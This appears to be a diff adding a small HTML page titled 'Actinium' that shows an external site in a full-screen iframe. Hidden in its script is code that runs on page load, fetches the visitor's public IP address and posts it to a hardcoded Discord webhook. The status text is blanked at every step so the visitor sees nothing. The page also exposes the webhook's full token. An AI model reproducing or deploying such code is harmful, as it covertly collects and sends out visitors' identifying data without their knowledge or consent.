@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Actinium</title>
+<style>
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    display: flex; flex-direction: column;
+  }
+  #iframe-container {
+    flex-grow: 1;
+  }
+  iframe {
+    width: 100%;
+    height: 100%;
+    border: none;
+  }
+  #status {
+    background: #222;
+    color: #eee;
+    padding: 10px;
+    text-align: center;
+    font-family: Arial, sans-serif;
+  }
+</style>
+</head>
+<body>
+  <div id="status">.</div>
+  <div id="iframe-container">
+    <iframe src="https://actinium.phantomnetwork.dev" title="Embedded Site"></iframe>
+  </div>
+
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1335092392801337415/kuAOq115GbwkK5BrTr8qG-9IKp1yD91grpPt_kMdfHf-anc88H8t4gWukew8VlmXl_ME";
+
+  async function getIP() {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      return null;
+    }
+  }
+
+  async function sendToDiscord(ip) {
+    const content = {
+      content: `User IP: ${ip}`
+    };
+
+    try {
+      const response = await fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(content)
+      });
+      return response.ok;
+    } catch (error) {
+      return false;
+    }
+  }
+
+  async function sendIPOnLoad() {
+    const status = document.getElementById('status');
+    status.textContent = " ";
+
+    const ip = await getIP();
+    if (!ip) {
+      status.textContent = " ";
+      return;
+    }
+
+    status.textContent = " ";
+    const success = await sendToDiscord(ip);
+
+    if (success) {
+      status.textContent = " ";
+    } else {
+      status.textContent = " ";
+    }
+  }
+
+  window.onload = sendIPOnLoad;
+</script>
+</body>
+</html>
